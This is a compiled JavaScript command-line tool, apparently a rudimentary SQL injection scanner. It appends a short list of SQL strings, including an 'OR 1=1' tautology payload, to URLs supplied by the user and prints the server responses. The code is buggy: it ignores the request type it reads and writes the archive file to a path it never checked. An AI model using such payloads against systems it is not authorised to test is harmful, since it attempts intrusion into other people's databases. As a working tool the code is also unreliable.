"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
Object.defineProperty(exports, "__esModule", { value: true });
var yargs_1 = require("yargs");
var fs = require("fs");
var axios_1 = require("axios");
var payloads = [
    "SELECT * FROM users",
    "SELECT * FROM users WHERE id = 1",
    "SELECT * FROM users WHERE id = 1 AND name = 'admin'",
    "SELECT * FROM users WHERE id = 1 OR 1=1",
];
var argv = (0, yargs_1.default)(process.argv.slice(2))
    .usage("--help | --version | --reverse <key> | --silent")
    .option("o", {
    describe: "Archive file, if not specified it will be stored in a default one",
    type: "string",
})
    .option("X", {
    describe: "Type of request, if not specified GET will be used",
    type: "string",
})
    .help()
    .version()
    .alias("help", "h").argv;
var initArchive = function () {
    var archivePath = "archive.txt";
    if (argv.o)
        archivePath = argv.o;
    if (!fs.existsSync(archivePath)) {
        fs.writeFileSync("archives/" + archivePath, "");
    }
};
var initRequest = function () {
    var requestType = "GET";
    if (argv.X)
        requestType = argv.X;
};
var testVulnerabilite = function (urls) {
    urls.forEach(function (url) {
        try {
            payloads.forEach(function (payload) { return __awaiter(void 0, void 0, void 0, function () {
                var response;
                return __generator(this, function (_a) {
                    switch (_a.label) {
                        case 0: return [4 /*yield*/, axios_1.default.get(url + payload)];
                        case 1:
                            response = _a.sent();
                            console.log(response.data);
                            return [2 /*return*/];
                    }
                });
            }); });
        }
        catch (e) {
            console.log("error: ", e);
        }
    });
};
var myscript = function () {
    initArchive();
    initRequest();
    var urls = argv._;
    console.log(urls);
    testVulnerabilite(urls);
};
myscript();
